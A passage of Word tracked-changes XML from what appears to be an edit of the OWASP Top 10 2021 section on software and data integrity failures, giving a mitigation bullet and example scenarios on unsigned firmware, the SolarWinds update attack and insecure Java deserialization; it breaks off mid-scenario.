    <w:p w14:paraId="3E19AFB1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2992" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2993" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Ensure that unsigned or unencrypted serialized data is not sent to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7A75E307" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2994" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2995" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    untrusted clients without some form of integrity check or digital</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1793798F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2996" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2997" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    signature to detect tampering or replay of the serialized data</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0FAB19BA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32069F95" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## Example Attack Scenarios</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4324D4A5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2998" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76FE9CA6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2999" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #1</w:t>
      </w:r>
      <w:ins w:id="3000" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Update without </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>signing:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* Many home routers, set-top</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="20CC7CED" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3001" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3002" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>boxes, device firmware, and others do not verify updates via signed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5FE143DF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3003" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3004" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>firmware. Unsigned firmware is a growing target for attackers and is</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5FF5AF8E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3005" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3006" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>expected to only get worse. This is a major concern as many times there</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6F5CC9DA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3007" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3008" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>is no mechanism to remediate other than to fix in a future version and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="55B8A648" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3009" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3010" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>wait for previous versions to age out.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="27CFFC30" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="3011" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="3012" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923173"/>
    </w:p>
    <w:p w14:paraId="710A83B8" w14:textId="32DF125C" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3013" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="3014" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #2</w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="3012"/>
      <w:del w:id="3015" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3016" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> SolarWinds malicious update**: Nation-states have been</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3B6C1238" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3017" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3018" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>known to attack update mechanisms, with a recent notable attack being</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3C03C93B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3019" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3020" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>the SolarWinds Orion attack. The company that develops the software had</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="784BC2EF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3021" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3022" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>secure build and update integrity processes. Still, these were able to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D823740" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3023" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3024" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>be subverted, and for several months, the firm distributed a highly</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="578E3F6E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3025" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3026" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>targeted malicious update to more than 18,000 organizations, of which</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="07244D1C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3027" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3028" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>around 100 or so were affected. This is one of the most far-reaching and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="16AEDF1A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3029" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3030" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>most significant breaches of this nature in history.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4DB19733" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3031" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3102668E" w14:textId="32D02399" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3032" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3033" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">**Scenario #3 Insecure </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Deserialization:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> A React application calls a</w:t>
      </w:r>
      <w:del w:id="3034" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4425260F" w14:textId="75F265B1" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3035" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>set of Spring Boot microservices. Being functional programmers, they</w:t>
      </w:r>
      <w:del w:id="3036" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6031EA6F" w14:textId="6F343195" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3037" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tried to ensure that their code is immutable. The solution they came up</w:t>
      </w:r>
      <w:del w:id="3038" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="75FB8E1F" w14:textId="405F0BC1" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3039" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">with is serializing </w:t>
      </w:r>
      <w:ins w:id="3040" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">the </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>user state and passing it back and forth with</w:t>
      </w:r>
      <w:del w:id="3041" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4E882762" w14:textId="4FE1BE06" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3042" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">each request. An attacker notices the </w:t>
      </w:r>
      <w:del w:id="3043" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>"</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3044" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>"`</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rO0</w:t>
      </w:r>
      <w:del w:id="3045" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>"</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3046" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>`"</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Java object signature</w:t>
      </w:r>
      <w:del w:id="3047" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3048" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> (in base64)</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:del w:id="3049" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="585BB8A3" w14:textId="2243CF03" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3050" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
